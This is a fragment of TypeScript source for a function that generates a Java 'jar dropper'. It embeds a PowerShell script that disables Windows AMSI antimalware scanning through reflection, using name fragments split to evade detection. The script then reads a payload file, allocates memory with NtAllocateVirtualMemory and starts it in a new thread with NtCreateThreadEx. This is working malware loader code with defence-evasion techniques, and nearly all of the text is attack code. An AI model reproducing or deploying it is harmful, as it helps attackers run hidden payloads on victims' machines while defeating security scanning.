...
function generateJarDropperSource(jarPersist: boolean): string {
  ...
  return [
    ...
    "    log(\"payload written to \"+sf.getAbsolutePath());",
    ...
    "    String ps=",
    "      \"try{$w=[Ref].Assembly.GetType('System.Ma'+'nagement.Auto'+'mation.Am'+'siUt'+'ils');\"",
    "      +\"$f=$w.GetField('am'+'siIn'+'itFa'+'iled','NonPublic,Static');\"",
    "      +\"$f.SetValue($null,$true)}catch{};\"",
    "      +\"function L($m){[IO.File]::AppendAllText('\"+lp+\"',(Get-Date -f 'HH:mm:ss')+' '+$m+\\\"\\\\n\\\")};\"",
    "      +\"L('ps started');\"",
    "      +\"$b=[IO.File]::ReadAllBytes('\"+sp+\"');\"",
    "      +\"L('read '+$b.Length+' bytes');\"",
    "      +\"$s=$b.Length;\"",
    "      +\"try{Add-Type -TypeDefinition '\"+td2+\"';}catch{L('add-type error: '+$_)};\"",
    "      +\"L('add-type ok');\"",
    "      +\"$p=[IntPtr]::Zero;$z=[IntPtr]$s;\"",
    "      +\"$r=[N]::NtAllocateVirtualMemory(-1,[ref]$p,[IntPtr]0,[ref]$z,0x3000,0x04);\"",
    "      +\"L('alloc ret='+$r+' ptr='+$p);\"",
    ...
    "      +\"L('protect ok');\"",
    "      +\"$t=[IntPtr]::Zero;\"",
    "      +\"$r2=[N]::NtCreateThreadEx([ref]$t,0x1FFFFF,[IntPtr]0,-1,$p,[IntPtr]0,$false,0,0,0,[IntPtr]0);\"",
